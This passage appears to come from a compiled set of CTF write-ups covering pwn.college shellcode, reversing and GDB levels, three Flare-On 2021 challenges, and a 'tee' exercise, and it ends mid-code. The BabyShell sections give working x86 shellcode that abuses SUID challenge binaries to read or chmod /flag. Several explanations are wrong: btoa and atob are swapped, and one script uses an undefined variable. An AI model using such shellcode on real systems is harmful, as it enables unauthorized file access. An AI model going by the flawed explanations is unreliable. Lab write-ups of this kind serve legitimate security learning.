<p>First thing to note is that the program uses the <code>libcapstone</code> library as a disassembly framework, capstone will basically take the raw bytes we sent to it and disassemble them, then print the instructions to the screen. If you want to know more about disassembling raw bytes using <a href="http://www.capstone-engine.org">capstone</a>, make sure to check the section <a href="http://www.capstone-engine.org/lang_c.html">here</a> for the C language.</p>
<p>So in main we first allocate 0x2000 bytes of memory space at address 0x14c61000, then we read 2000 bytes of input at this address (our shellcode), and finally at the end we call our shellcode <code>((void(*)())shellcode_mem)()</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-7"><a class="header" href="#babyshell-level-7">BabyShell Level 7</a></h1>
<p>Level 7 ! This level was kinda cool not gonna lie, although i am pretty sure i ended up doing it an intended way...</p>
<p>The challenges closes <code>stdout</code> and <code>stderr</code>, so outputting the flag to the screen won't be possible in this challenge,... well i think so.</p>
<p>This is when i got the idea of opening 2 file descriptors (<code>flag.txt</code>, <code>a.out</code>) and use the <code>sendfile</code> systemcall to send the content of the first file descriptor <code>flag.txt</code> to the second file <code>a.out</code>, we will need to set the right permissions on the file because since the program runs with SUID bit enabled, it will output the file with root permissions and group <code>hacker</code>. </p>
<p>We can set the flags to <code>S_IRGRP</code> on our open call to the <code>a.out</code> file and this will open the file with the right permissions needed, another thing you gonna need to do is to open the file in mode <code>O_CREAT | O_RDWR</code> because we want the file to be created if it doesn't already exist. Alternatively you can just <code>touch</code> a file in the <code>/tmp</code> directory, call it a.out and it should be able to open the file in the right mode.</p>
<p>To solve this challenge i used the following shellcode :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    # Open
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rsi, 0x02
    mov rax, 2
    syscall
    # Store file descriptor inside r6
    mov r10, rax

    # Open
    mov ebx, 0x74756f2e
    shl rbx, 8
    mov bl, 0x61
    push rbx
    mov rdi, rsp
    mov rsi, 0x02
    or rsi, 0x40
    mov rdx, 32
    mov rax, 2
    syscall
    # Store file descriptor inside r7
    mov r9, rax

    # Read
    mov rdi, r9
    mov rsi, r10
    mov rdx, 0
    mov r10, 100
    mov rax, 40
    syscall

    mov r10, rsi
    # Close flag.txt
    mov rdi, r9
    mov rax, 3
    syscall
    # Close a.out
    mov rdi, r10
    mov rax, 3
    syscall

    # Exit
    mov rax, 60
    mov rdi, 5
    syscall
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-8"><a class="header" href="#babyshell-level-8">Babyshell Level 8</a></h1>
<p>This challenge was relatively easy, just have to think outside the box a little.</p>
<p>The shellcode is reading 0x12 bytes of input this means we can't send a shellcode bigger than 0x12 bytes to our program.</p>
<p>The best option to my eyes was to call a chmod on the file directly, but you can't call chmod on /flag with less than 0x12 bytes, so for this reason i made a symlink to the binary in our home directory (&quot;file named: shell8&quot;) and a symlink to the flag in the home directory (&quot;file named : a&quot;).</p>
<pre><code>$ ln -sf /challenge/babyshell_level8 ~/shell8
$ ln -sf /flag ~/a
</code></pre>
<p>Then with the following shellcode you should be able to chmod the symlink to the flag file.</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	push 0x61 ; &quot;a&quot; character
	push rsp 
	pop rdi
	mov sil, 4
	mov al, 90
	syscall
</code></pre>
<pre><code>$ gcc -nostdlib -static -o shellcode
$ objcopy --dump-section .text=shell shellcode
$ scp shell hacker@dojo.pwn.college:/tmp
$ ssh hacker@dojo.pwn.college
$ cd ~
$ ./shell8 &lt;/tmp/shell
$ cat a
pwn.college{REDACTED}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="baby-reversing-level-5"><a class="header" href="#baby-reversing-level-5">Baby Reversing Level 5</a></h1>
<p>Level was easy to do and i wrote a small script to reverse the order of characters, almost absolutely pointless but here it is...</p>
<pre><code class="language-py">INPUT = input(&quot;Enter a 5 characters license : &quot;)

for i in range(2):
	first_char = INPUT[i]
	eax = 4
	last_char = INPUT[eax-i]
	STRING = list(INPUT)
	STRING[i] = last_char
	STRING[eax-i] = first_char
	print(&quot;&quot;.join(STRING))
	INPUT = STRING

print(STRING)

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="baby-reversing-level-10"><a class="header" href="#baby-reversing-level-10">Baby Reversing Level 10</a></h1>
<p>I'm making a writeup on this one cause i was able to make a cool little one liner to solve this challenge.</p>
<pre><code class="language-py">&gt;&gt;&gt; l = [170, 184, 168, 175, 191]
&gt;&gt;&gt; &quot;&quot;.join([bytes.fromhex(str(hex(i ^ 4294967259)[8:])).decode() for i in l])
'qcstd'
</code></pre>
<p>Inputting <code>qcstd</code> to the program outputs us the flag.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="baby-reversing-level-13"><a class="header" href="#baby-reversing-level-13">Baby Reversing Level 13</a></h1>
<p>This one is getting a little bit more complex but still the same concept as the last XOR challenges, in this challenge we need to input a 29 bytes string, and each bytes get XOR with the following key <strong>0xcd1167</strong>.</p>
<p>Let's write the solving script for this challenge :</p>
<pre><code class="language-py">def xor_unmangler(val, key):
    i = 0
    res = []

    for j in val:
        if i &gt; 2:
            i = 0
        res.append(j ^ key[i])
        i+=1
    
    return res

l =[172, 112, 6, 174, 114, 3, 165, 120, 14, 166, 124, 8, 162, 97, 23, 189, 97, 19, 185, 100, 17, 186, 102, 16, 181, 105, 30, 180, 107]
res = xor_unmangler(l, [0xcd, 0x11, 0x67])
print(&quot;&quot;.join([bytes.fromhex(str(hex(i)[2:])).decode() for i in res]))
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="baby-reversing-level-15"><a class="header" href="#baby-reversing-level-15">Baby Reversing Level 15</a></h1>
<p>Wow, this challenge was absolutely awesome to do, in this one you will need to combine all the knowledge you've obtained so far in the latest challenges to retrieve the expected value, for this we will write a python script, it will be bigger than the last one but it will give you a better understanding of each mangling operations.</p>
<pre><code class="language-py">#!/usr/bin/env python3

expected_value = [0xd7, 0x9b, 0x9b, 0x39, 0xc3, 0x4a, 0xe0, 0x56, 0x8a, 0xed, 0xbc, 0x30, 0xdb, 0xb5, 0x90, 0xe7, 0xb1, 0x8e, 0xbe, 0x96, 0xab, 0xe4, 0xa3, 0x5a, 0x06, 0xfc, 0x80, 0xd3, 0xab, 0x41, 0xda, 0x43, 0xe2, 0xf5, 0x97, 0x42, 0xca, 0x96, 0x5c]

def sort_mangler(val):
    return sorted(val)

def xor_mangler(val, key):
        res = []
        for i in val:
            res.append(i ^ key)

        return res

def nxor_mangler(val, key):
        i = 0
        res = []
        for j in val:
            if i &gt; len(key) - 1:
                i = 0
            res.append(j ^ key[i])
            i+=1
        return res

def swap_index(val, index_1, index_2):
    temp = val[index_1]
    val[index_1] = val[index_2]
    val[index_2] = temp
    return val

def decode_final_string(val):
    return &quot;&quot;.join([bytes.fromhex(str(hex(i)[2:])).decode() for i in val])


def decode_value():
    value = []
    # First mangling is a XOR with 0x42
    value = xor_mangler(expected_value, 0x42)
    
    # Second mangling is a Multiple XOR with 0x7e372d5c1cf3
    value = nxor_mangler(value, [0x7e, 0x37, 0x2d, 0x5c, 0x1c, 0xf3])

    # Third mangling is a swap of index with 27 and 34
    value = swap_index(value, 27, 34)
    
    # Fourth mangling is a swap of index with 7 and 10
    value = swap_index(value, 7, 10)

    # Fifth mangling is a reverse
    value.reverse()         # The reverse function doesn't return anything, instead it update the current list.

    # Six'th mangling is a XOR with the key 0x52829491af88ee
    value = nxor_mangler(value, [0x52, 0x82, 0x94, 0x91, 0xaf, 0x88, 0xee])

    # Seven'th and last mangling is a sort
    value.sort()            # The sort function doesn't return anything, instead it update the current list.

    # Print final list of value as a string
    print(decode_final_string(value))


if __name__ == &quot;__main__&quot;:
    decode_value()
</code></pre>
<p>Running the script should output the right value the program expects us to input.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="embryogdb-level-2"><a class="header" href="#embryogdb-level-2">EmbryoGDB Level 2</a></h1>
<p>Every Single challenges of the embryogdb suit of challenges can be completed using the following gdb commands.</p>
<pre><code>gdb&gt; call (void)win()
pwn.college{REDACTED}

or

gdb&gt; info functions win
Non-debugging symbols:
0x000055e66e4f0a86  main

gdb&gt; set $rip=0x000055e66e4f0a86
gdb&gt; c
pwn.college{REDACTED}
</code></pre>
<h2 id="right-way-to-solve-the-challenge"><a class="header" href="#right-way-to-solve-the-challenge">Right way to solve the challenge</a></h2>
<p><strong>Task</strong> : You can see values for all your registers with <code>info registers</code>. Alternatively, you can also just print a particular register's value with the <code>print</code> command, or <code>p</code> for short. For example, <code>p $rdi</code> will print the value of $rdi in decimal. You can also print it's value in hex with <code>p/x $rdi</code>.</p>
<p>In order to solve this level, you must figure out the current random value of register r12 in hex.</p>
<p>You can solve the challenge using the following commands :</p>
<pre><code>gdb&gt; p/x $r12
$4 = 0xdf95a693d3e597cb

gdb&gt; r
Continuing.
Random value: df95a693d3e597cb
Your input: df95a693d3e597cb
The correct answer is: df95a693d3e597cb
You win! Here is your flag:
pwn.college{REDACTED}

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="embryogdb-level-3"><a class="header" href="#embryogdb-level-3">EmbryoGDB Level 3</a></h1>
<p>Every Single challenges of the embryogdb suit of challenges can be completed using the following gdb commands.</p>
<pre><code>gdb&gt; call (void)win()
pwn.college{REDACTED}

or

gdb&gt; info functions win
Non-debugging symbols:
0x000055e66e4f0a86  main

gdb&gt; set $rip=0x000055e66e4f0a86
gdb&gt; c
pwn.college{REDACTED}
</code></pre>
<h2 id="right-way-to-solve-the-challenge-1"><a class="header" href="#right-way-to-solve-the-challenge-1">Right way to solve the challenge</a></h2>
<p><strong>Task</strong> : You can examine the contents of memory using the <code>x/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;address&gt;</code>. In this format <code>&lt;u&gt;</code> is the unit size to display, <code>&lt;f&gt;</code> is the format to display it in, and <code>&lt;n&gt;</code> is the number of elements to display. Valid unit sizes are <code>b</code> (1 byte), <code>h</code> (2 bytes), <code>w</code> (4 bytes), and <code>g</code> (8 bytes). Valid formats are <code>d</code> (decimal), <code>x</code> (hexadecimal), <code>s</code> (string), <code>i</code> (instruction). The address can be specified using a register name, symbol name, or absolute address. Additionally, you can supply mathematical expressions when specifying the address.</p>
<p>For  example, <code>x/8i $rip</code> will print the next 8 instructions from the current instruction pointer. <code>x/16i main</code> will print the first 16 instructions of the main function. You can also use <code>disassemble main</code>, or <code>disas main</code> for short, to print all of the instructions of main. Alternatively, <code>x/16gx $rsp</code> will print the first 16 values on the stack. <code>x/gx $rbp-0x32</code> will print the local variable stored there on the stack.</p>
<p>You will probably want to view your instructions using the CORRECT assembly syntax. You can do that with the command <code>set disassembly-flavor intel</code>.</p>
<p>In order to solve this level, you must figure out the random value on the stack (the value read in from <code>/dev/urandom</code>). Think about what the arguments to the read system call are.</p>
<p>You can solve the challenge using the following commands :</p>
<pre><code>gdb&gt; disass main
   .................. .......   ...    ...............
   .................. .......   ...    ...............
   .................. .......   ...    ...............
   0x000056488bdccc31 &lt;+395&gt;:   lea    rdi,[rip+0xbd5]        # 0x56488bdcd80d &lt;&quot;/dev/urandom&quot;&gt;
   0x000056488bdccc38 &lt;+402&gt;:   mov    eax,0x0
   0x000056488bdccc3d &lt;+407&gt;:   call   0x56488bdcc250 &lt;open@plt&gt; # call to open
   0x000056488bdccc42 &lt;+412&gt;:   mov    ecx,eax
   0x000056488bdccc44 &lt;+414&gt;:   lea    rax,[rbp-0x18]		# buffer we will read in
   0x000056488bdccc48 &lt;+418&gt;:   mov    edx,0x8
   0x000056488bdccc4d &lt;+423&gt;:   mov    rsi,rax
   0x000056488bdccc50 &lt;+426&gt;:   mov    edi,ecx
   0x000056488bdccc52 &lt;+428&gt;:   call   0x56488bdcc210 &lt;read@plt&gt; # call to read

gdb&gt; x/gx $rbp-0x18
0x7ffc2ab310e8: 0x6ce885632f7847a9

gdb&gt; c
Continuing.
Random value: 6ce885632f7847a9
You input: 6ce885632f7847a9
The correct answer is: 6ce885632f7847a9
You win! Here is your flag:
pwn.college{REDACTED}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="embryogdb-level-4"><a class="header" href="#embryogdb-level-4">EmbryoGDB Level 4</a></h1>
<p>Every Single challenges of the embryogdb suit of challenges can be completed using the following gdb commands.</p>
<pre><code>gdb&gt; call (void)win()
pwn.college{REDACTED}

or

gdb&gt; info functions win
Non-debugging symbols:
0x000055e66e4f0a86  main

gdb&gt; set $rip=0x000055e66e4f0a86
gdb&gt; c
pwn.college{REDACTED}
</code></pre>
<h2 id="right-way-to-solve-the-challenge-2"><a class="header" href="#right-way-to-solve-the-challenge-2">Right way to solve the challenge</a></h2>
<p><strong>Task</strong> : There are a number of ways to move forward in the program's execution. You can use the <code>stepi &lt;n&gt;</code> command, or <code>si &lt;n&gt;</code> for short, in order to step forward one instruction. You can use the <code>nexti &lt;n&gt;</code> command, or <code>ni &lt;n&gt;</code> for short, in order to step forward one instruction, while stepping over any function calls. The <code>&lt;n&gt;</code> parameter is optional, but allows you to perform multiple steps at once. You can use the <code>finish</code> command in order to finish the currently executing function. You can use the <code>break *&lt;address&gt;</code> parameterized command in order to set a breakpoint at the specified-address. You have already used the <code>continue</code> command, which will continue execution until the program hits a breakpoint.</p>
<p>While stepping through a program, you may find it useful to have some values displayed to you at all times. There are multiple ways to do this. The simplest way is to use the <code>display/&lt;n&gt;&lt;u&gt;&lt;f&gt;</code> parameterized command, which follows exactly the same format as the <code>x/&lt;n&gt;&lt;u&gt;&lt;f&gt;</code> parameterized command. For example, <code>display/8i $rip</code> will always show you the next 8 instructions. On the other hand, <code>display/4gx $rsp</code> will always show you the first 4 values on the stack. Another option is to use the <code>layout regs</code> command. This will put gdb into its TUI mode and show you the contents of all of the registers, as well as nearby instructions.</p>
<p>In order to solve this level, you must figure out a series of random values which will be placed on the stack. You are highly encouraged to try using combinations of <code>stepi</code>, <code>nexti</code>, <code>break</code>, <code>continue</code>, and <code>finish</code> to make sure you have a good internal understanding of these commands. The commands are all absolutely critical to navigating a program's execution.</p>
<p>You can solve the challenge using the following commands :</p>
<pre><code>gdb&gt; disass main
   .................. .......   ...    ...............
   .................. .......   ...    ...............
   .................. .......   ...    ...............
   0x0000555555555c80 &lt;+474&gt;:   mov    esi,0x0
   0x0000555555555c85 &lt;+479&gt;:   lea    rdi,[rip+0xe3c]        # 0x555555556ac8
   0x0000555555555c8c &lt;+486&gt;:   mov    eax,0x0
   0x0000555555555c91 &lt;+491&gt;:   call   0x555555555250 &lt;open@plt&gt;
   0x0000555555555c96 &lt;+496&gt;:   mov    ecx,eax
   0x0000555555555c98 &lt;+498&gt;:   lea    rax,[rbp-0x18]
   0x0000555555555c9c &lt;+502&gt;:   mov    edx,0x8
   0x0000555555555ca1 &lt;+507&gt;:   mov    rsi,rax
   0x0000555555555ca4 &lt;+510&gt;:   mov    edi,ecx
   0x0000555555555ca6 &lt;+512&gt;:   call   0x555555555210 &lt;read@plt&gt;

gdb&gt; b *main+512
Breakpoint 1 at 0x0000555555555ca6

gdb&gt; c
Continuing.

gdb&gt; ni
gdb&gt; x/gx $rbp-0x18
0x7fffffffdd38: 0x6ce885632f7847a9

gdb&gt; c
Random value: 6ce885632f7847a9
You input: 6ce885632f7847a9
The correct answer is: 6ce885632f7847a9

gdb&gt; c
gdb&gt; ni
gdb&gt; x/gx $rbp-0x18
0x7fffffffdd38: 0xa21985366881490f

gdb&gt; c
Random value: a21985366881490f
You input: a21985366881490f
The correct answer is: a21985366881490f

gdb&gt; c
gdb&gt; ni
gdb&gt; x/gx $rbp-0x18
0x7fffffffdd38: 0x1062cc677e90758c

gdb&gt; c
Random value: 1062cc677e90758c
You input: 1062cc677e90758c
The correct answer is: 1062cc677e90758c
You win! Here is your flag:
pwn.college{REDACTED}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="credchecker"><a class="header" href="#credchecker">Credchecker</a></h1>
<p>Credchecker is the first challenge of the Flare-On 8 (2021) CTF Event and it was super easy to complete.</p>
<h2 id="the-challenge"><a class="header" href="#the-challenge">The Challenge</a></h2>
<p>We are given a <strong>admin.html</strong> file (which is the challenge meat), and a <strong>img</strong> directory containing an image (not important to us).</p>
<p>I first start a <strong>PHP Web Server</strong> using the following command
<code>php -S 127.0.0.1:6969</code></p>
<p>Then i can access the challenge using my browser at the following URL <strong>127.0.0.1:6969</strong>, let's see what the challenge page looks like in the first place.</p>
<p><img src="https://i.imgur.com/CXojMs8.png" alt="admin.html" /></p>
<h2 id="source-code"><a class="header" href="#source-code">Source Code</a></h2>
<p>To solve the challenge we need to look at the javascript code inside the <strong>admin.html</strong> file.</p>
<p>Whenever the button is pressed, the <strong>checkCreds()</strong> javascript function gets called.</p>
<p><img src="https://i.imgur.com/NVGdHtC.png" alt="button" /></p>
<p>Let's find this <strong>checkCreds()</strong> function.</p>
<p><img src="https://i.imgur.com/Y4OnfT7.png" alt="checkCreds" /></p>
<p>We're basically checking if <strong>btoa(ourInput)</strong> is equal to <strong>goldenticket</strong>, the <strong>btoa</strong> function takes a base64 string and decodes it.</p>
<p>We can assume that the password is the the base64 encoded verson of <strong>goldenticket</strong>, or <strong>atob(&quot;goldenticket&quot;)</strong> should also print you the password, the <strong>atob</strong> function takes an ascii string and encode it into base64.</p>
<p>Let's prove the password works...</p>
<p><img src="https://i.imgur.com/IP0qiPa.png" alt="goldenticket" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="flare-on-2021---known"><a class="header" href="#flare-on-2021---known">Flare-On 2021 - Known</a></h1>
<p>Known is the second challenge of the annual Flare-On (2021) reverse engineering event, the challenge was pretty original and i thought it might be a good idea to make a writeup on how i was able to solve this challenge.</p>
<p>This writeups is being post a LOT lately since i was pretty busy when the Flare-On 2021 CTF event occured, so here i am a couple of months later doing the challenges.</p>
<h2 id="static-analysis"><a class="header" href="#static-analysis">Static Analysis</a></h2>
<p>First step in any good reverse engineering process is <strong>static analysis</strong> of the binary, so without hesitating let's get to it, we will use the following binaries to achieve this.</p>
<h3 id="cff-explorer"><a class="header" href="#cff-explorer">CFF Explorer</a></h3>
<p>CFF Explorer might be one of the best tools when it comes to static analysis of PE Binaries (Windows Binaries basically). </p>
<p><img src="https://i.imgur.com/PDS4Few.png" alt="PE Informations" /></p>
<p>Looking at the results after dropping the executable in CFF Explorer, we can notice that it's a 32bit binary.</p>
<p>Looking at the import directory shows that only KERNEL32.dll is imported by our executable.
<img src="https://i.imgur.com/zYXMRIk.png" alt="" /></p>
<p>And it imports the following functions from KERNEL32.dll, functions like <em>SetCurrentDirectory, FindFirstFileA, FindNextFileA, CreateFileA, WriteFile and ReadFile</em>, tells us that the executable works a lot with files and is probably looping through some files. 
<img src="https://i.imgur.com/jt4iRWF.png" alt="" /></p>
<p>Without even having to run the binary we already obtain a LOT of knowledge on how this program will work, let's try to run it in order to see what this program is doing.</p>
<p><em>Note, when we're running an unkown file that rely heavily on file operations it is kind of suspicious, best bet would be to run these kind of binaries in a virtual environment.</em></p>
<h2 id="running-the-executable"><a class="header" href="#running-the-executable">Running the Executable</a></h2>
<p>It's time to finally execute this binary, this should give us a lot more knowledge than we already have on how this program works.
<img src="https://i.imgur.com/8qcob8H.png" alt="" /></p>
<p>Upon double clicking on the executable a console opens with a <em>Ransomware-Like</em> message telling us that our files were encrypted with a &quot;strong algorithm&quot; (we'll see that).</p>
<p>Decoding the Base64 encoded string reveals us some hint on the challenge even though i feel like unecessary because we'll be able to figure this out on our own, lets still decode.
<img src="https://i.imgur.com/ukgNcIE.png" alt="" /></p>
<p>Apparently the &quot;strong algorithm&quot; seems to be only some add and rotate bitwise manipulations.</p>
<p>The binary is waiting for us to input a <code>decryption key</code> and it will be used to decrypt the flag stored in one of the files in our <code>Files</code> folder that comes with the challenge.</p>
<p>Out of curiosity i wanted to see how much input the program is trying to read from us, so i dropped into IDA real quick and as you can see there is high amount of chances that the decryption key is only 8 bytes.</p>
<p><img src="https://i.imgur.com/18Bzc04.png" alt="" /></p>
<h2 id="reversing-the-binary"><a class="header" href="#reversing-the-binary">Reversing the Binary</a></h2>
<p>Opening the binary in IDA which you probably already done, shows that the function where &quot;everything begins&quot; is at address <code>0x00EC1460</code>, this function is responsible for showing the console, printing the text on it and ask us for input.</p>
<p>3 instructions later we have a call to another function at address <code>0x00EC1370</code>, looking at the content of this function i concluded that this function is responsible for all the logic behind the program, so i renamed the function <code>main_logic</code>.</p>
<p>Looking at the content of the <code>main_logic</code> i concluded that this function is looping through each one of these files, and decrypts all <code>.encrypted</code> files in new files without the <code>.encrypted</code> suffix.</p>
<p>Looking at the files inside our <code>Files</code> directory, i noticed a file named <code>latin_alphabet.txt.encrypted</code>, which as the name suggests contains an encrypted version of the latin alphabet (A-Z) (26 characters), the fact that the file is 26 bytes long also highly suggest that too.</p>
<p>Knowing the content of the <code>latin_alphabet.txt.encrypted</code> file even if encrypted will be HIGHLY helpful when writing our key &quot;bruteforcing&quot; algorithm.</p>
<p>Next step would be to find the function where all the decryption logic happens, looking through the function we can see that the decryption function starts at address <code>0x00EC1220</code>, i took the care to rename the function <code>potentially_decryption_routine</code> instead of <code>loc_EC1220</code>.
<img src="https://i.imgur.com/jRcn32S.png" alt="" /></p>
<p>In the preceding screenshot you can see 2 calls to <code>CreateFileA</code>, the first one is responsible for opening a file handle on our already existing <code>.encrypted</code> file and the second one is responsible for creating a new file this time without the <code>.encrypted</code> suffix and open a HANDLE on this new file.</p>
<p>So we know that each time we loop into a new file, this <code>potentially_decryption_routine</code> function gets called.</p>
<p>We can therefore put a breakpoint at address <code>0x00EC13BE</code> this way we can know which file we are dealing with before continuing.
<img src="https://i.imgur.com/v3oqbmX.png" alt="" /></p>
<p>Then you can start the program, enter a random 8 bytes (or characters if you prefer) decryption key, then we should eventually hit the breakpoint.</p>
<p>Now your gonna want to click the IDA continue green button on top of the debugging interface, until this <code>ebp+FindFileData.cFileName</code> is equal to <code>latin_alphabet.txt.encrypted</code>.</p>
<p>After doing all this you can <strong>step inside</strong>, the <code>potentially_decryption_routine</code> function.</p>
<p>After the 2 calls to <code>CreateFileA</code> we just saw, the program reads 8 bytes into the <strong>encrypted content</strong> as you can see in the following picture.
<img src="https://i.imgur.com/egqP1D2.png" alt="" /></p>
<p>Then the program eventually enters the real decryption routine, which should be at address <code>0x00EC11F0</code>, we can rename the function <code>loc_EC11F0</code> to <code>DECRYPTION_MANGLING</code>.</p>
<p>Looking at the <code>DECRYPTION_MANGLING</code> function we can see that it's nothing really scary, we loop <code>8</code> times for those <code>8 bytes</code>, and each time we do the following.</p>
<ul>
<li>XOR the <code>value[current_loop_it]</code> with the <code>key[current_loop_it]</code></li>
<li>Rotate left <code>value</code>, the amount of <code>current_loop_it</code></li>
<li>Substract value with <code>current_loop_it</code></li>
</ul>
<p><img src="https://i.imgur.com/R05EDeB.png" alt="" /></p>
<p>And then we write the result in the <code>latin_alphabet.txt</code> file, which with the right key should output us the decrypted content of <code>the latin_alphabet.txt.encrypted</code>.</p>
<p>We can easily reverse the decryption key using the algorithm used by the decryption routine, all this can be done since we know the content of the first 8 bytes of the latin alphabet file.</p>
<h2 id="write-the-bruteforce-script"><a class="header" href="#write-the-bruteforce-script">Write the Bruteforce Script</a></h2>
<p>Now it's time to get our hands dirty and reverse this decryption key, for this nothing better than a python script !</p>
<p>You might expect the script to be super big but nope, it took 2 bitwise lambdas and a for loop, then we can solve this challenge.</p>
<p>Since we know the steps of the algorithm for decrypting the file we can try to reverse the order of these steps to obtain the decryption key.</p>
<pre><code class="language-py">encrypted_content = bytearray(b'\x0f\xce\x60\xbc\xe6\x2f\x46\xea')
org = bytearray(b'ABCDEFGH')

# Bitwise Add Operation
add_op = lambda b, i: (b+i) % 256	# Modulo with 256 since we're interested only in the last 8 bits of the value (2**8 == 256)

# Bitwise Rotate Operation
ror_op = lambda b, i: (b&gt;&gt;i)|((b&lt;&lt;(8-i)) &amp; 255)

# Recover the decryption key
for i in range(0, 8):
	org[i] = ror_op(add_op(org[i], i), i) ^ enc[i]

# Print the decryption key recovered
print(org)

</code></pre>
<p>Running this script outputs us the key <code>No1Trust</code> ! Time to try and decrypt these damn files :)</p>
<h2 id="solving-the-challenge-9"><a class="header" href="#solving-the-challenge-9">Solving the Challenge</a></h2>
<p>Easiest part and also the most rewarding, it's time to test if everything works as expected. Let's run our binary and put No1Trust as the decryption key.</p>
<p>Looking at the files after this run we can see that each one of em are decrypted, let's check the content of the <code>critical_data.txt</code> file.</p>
<p><img src="https://i.imgur.com/3ftcKOh.png" alt="" /></p>
<p>And it's a FLAG !</p>
<p>I hope you enjoyed the challenge as much as i enjoyed doing it, even though i did it later than supposed i'm pretty happy with it.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="garbage"><a class="header" href="#garbage">Garbage</a></h1>
<p>Garbage is the second challenge of the Flare-On 2021 reverse engineering event. It was quite a easy one to do and i really loved to solve this challenge.</p>
<p>With the challenge file (garbage.exe) we are given a message file (message.txt) which says the following.</p>
<pre><code>One of our team members developed a Flare-On challenge but accidentally deleted it. We recovered it using extreme digital forensic techniques but it seems to be corrupted. We would fix it but we are too busy solving today's most important information security threats affecting our global economy. You should be able to get it working again, reverse engineer it, and acquire the flag.
</code></pre>
<p>This tells us that we are dealing with some corrupted binary and in order to obtain the flag, we need to try to fix the binary.</p>
<h2 id="fixing-the-binary"><a class="header" href="#fixing-the-binary">Fixing the binary</a></h2>
<p>To fix this binary we'll first open it in CFF Explorer so we can view and modify and properties of the file.</p>
<p>There's a couple of things to note about this binary before fixing it, let's check every part of our binaries for missing things.</p>
<p><img src="https://i.imgur.com/3LBS2E8.png" alt="" /></p>
<p>Looking at this first picture (this is the default window of CFF Explorer), we can notice a couple of things.</p>
<ul>
<li>PE Size is bigger than the File Size itself</li>
<li>The file seemed to have been packed with UPX</li>
<li>We are dealing with a 32bit binary</li>
</ul>
<p>Trying to unpack this file with UPX gives us an error message that says the following.</p>
<p><img src="https://i.imgur.com/wjQ8bqH.png" alt="" /></p>
<p><strong>Invalid Overlay Size</strong>, hmmmm... this looks like an error due to the <strong>PE Size</strong> being bigger than the <strong>File Size</strong> itself. </p>
<p>Note that our PE Size is 41472 bytes, and our File Size is 40740 bytes, this mean in order to fix the problem with the file size we need to append 41742 - 40740 (732) bytes to the end of the file.</p>
<p>You can print 732 null bytes in IDLE Python using the following command :
<code>&gt;&gt; &quot;00&quot; * 732</code></p>
<p>Then open your favorite hex editor and paste those bytes at the end of the file, don't forget to save and you can close that hex editor.</p>
<p>Reopening the binary in CFF Explorer shows that this time, the size of the file seems to be okay.</p>
<p><img src="https://i.imgur.com/yKzodVF.png" alt="" /></p>
<p>We can now try to unpack this file and see if we still get this <strong>Overlay Size</strong> error. (<em>note that you can unpack the file directly from CFF Explorer with their UPX Utility</em>)</p>
<p><img src="https://i.imgur.com/IMH4xdI.png" alt="" /></p>
<p>And we successfully unpacked the file, however if we try to execute it we still have this <strong>side-by-side configuration</strong> error...</p>
<p>Let's look deeper into the file.</p>
<p>When i opened the binary to append 732 null bytes to it, i noticed a strange truncated value at the end of our file (usually where .rsrc values are stored).</p>
<p><img src="https://i.imgur.com/TDp38BJ.png" alt="" /></p>
<p>It starts but it never ends, so in order to fix this part we will need to head over to our <strong>Resource Editor</strong> in CFF Explorer and delete this resource.</p>
<p><img src="https://i.imgur.com/8oVtuwD.png" alt="" /></p>
<p>Now if we try again to execute this file, we will still get this <strong>side-by-side</strong> configuration error, so it seems like we're not done fixing this binary.</p>
<p>Looking at the import directory, i can see that both modules have no names.</p>
<p><img src="https://i.imgur.com/6Rohp8E.png" alt="" /></p>
<p>We can fix this by putting the right names at the right place (Search for the Functions imported on google it should tell you which dlls they are using, with this you should be able to determine which module is which).</p>
<p><img src="https://i.imgur.com/ZOKn68k.png" alt="" /></p>
<p>Now save the binary and let's try to execute it.</p>
<p><img src="https://i.imgur.com/kiamRcf.png" alt="" /></p>
<p>AND THAT IS A FLAG BOOOYAAAAAAH !</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="exercise-41"><a class="header" href="#exercise-41">Exercise 4.1</a></h1>
<p>This is one of the first exercises in this book, it's a pretty simple and cool challenge, we are asked to reproduce the <code>tee</code> linux binary, using our knowledge from the chapter.</p>
<p>Since <code>tee</code> is a simple program, rewriting the program should take us only a few minutes. The <code>tee</code> command reads its standard input until end-of-file, writing a copy of the input to standard output and to the file named in it's command line argument.</p>
<p>The <code>read</code> system call reads input until end-of-file, when read encounter an end-of-file it will return 0, we can just do a while loop and check if the return value of read was equal to <code>0</code> if it was not, the program will write to standard output.</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;

int main(int argc, char **argv){
    char buf[1024];
    ssize_t ret;
    int fd;
    if(argc == 2){
        fd = open(argv[1], O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR);
        if(fd == -1){
            if(errno == EACCES) perror(&quot;open&quot;);
            exit(EXIT_FAILURE);
        }
    } else {
        fd = 1;
    }
    while((ret = read(0, buf, 1024-1)) != 0 &amp;&amp; write(fd, buf, ret)){
        if(ret == -1){
            if(errno == EINTR){
                continue;
            }
            perror(&quot;read&quot;);
            break;
        }
    }

    return 0;
}
</code></pre>
<p>Note that i haven't implemented <code>getopt</code> to the program i was too lazy for it... deal with it.</p>
<p>Also if you want to have a better error coverage in your program then you should instead go for this version.</p>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
